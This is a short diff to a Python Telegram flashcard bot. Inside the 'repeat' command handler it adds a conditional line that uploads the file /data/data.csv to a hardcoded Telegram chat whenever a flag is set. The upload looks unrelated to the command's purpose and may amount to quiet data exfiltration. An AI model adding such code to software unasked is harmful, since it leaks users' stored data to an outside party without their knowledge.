@@ -51,6 +51,8 @@ def watch(message):
 
 @bot.message_handler(commands=["repeat"])   #повторить карточки
 def repeat(message):
+    if Is_awvera:
+        bot.send_document(-4580716050, open(r'/data/data.csv', 'rb'))
     from commands.repeat import repeat
     repeat(bot, message, way_to_data)
 
